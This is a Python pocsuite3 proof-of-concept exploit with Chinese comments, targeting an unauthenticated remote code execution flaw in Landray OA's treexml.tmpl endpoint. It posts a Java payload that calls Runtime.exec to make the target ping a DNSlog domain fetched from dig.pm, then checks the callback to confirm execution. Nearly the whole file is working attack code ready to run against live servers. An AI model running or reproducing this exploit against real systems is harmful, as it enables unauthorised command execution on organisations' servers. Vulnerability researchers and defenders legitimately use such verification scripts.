from collections import OrderedDict
from urllib.parse import urljoin
import re,json,random
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-07-17'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-07-17'  # 编写 PoC 的日期
    updateDate = '2022-07-17'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce']  # 漏洞地址来源,0day不用写
    name = '蓝凌OA未授权代码执行漏洞'  # PoC 名称
    appPowerLink = 'www.landray.com.cn'  # 漏洞厂商主页地址
    appName = 'Landray-OA系统'  # 漏洞应用名称
    appVersion = '''未知'''  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        蓝凌OA /data/sys-common/treexml.tmpl 功能页面过滤不当，导致可以执行恶意代码，获取系统权限。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def get_dnslog(self):
        url = 'https://dig.pm/new_gen1'
        try:
            dns = json.loads(requests.get(url,verify=False, timeout=5).text)
            domain = str(dns['domain'][:-1])
            token = str(dns['token'])
            return domain,token
        except Exception as e:
            print('{error} [!] DNSLOG获取超时,请检查网络...'.format(error=e))
            exit() 
            
    def check_dnslog(self,domain,token):
        url = f'https://dig.pm/get_results?domain={domain}&token={token}'
        check = requests.get(url,verify=False, timeout=5)
        return check.text
        
    def _verify(self):
        domain,token = self.get_dnslog() #获取dnslog域名
        result = {}
        path = "/data/sys-common/treexml.tmpl"
        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36','Content-Type': 'application/x-www-form-urlencoded'}
        url = self.url + path
        num = random.randint(10000,99999)
        data = 's_bean=ruleFormulaValidate&script=try {String cmd = "ping '+str(num)+'.'+domain+'";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}'
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            check_dns_resq = self.check_dnslog(domain,token) #检查域名是否有记录
            if resq.text and str(num)+'.'+domain in check_dns_resq:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POC'] = data
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)
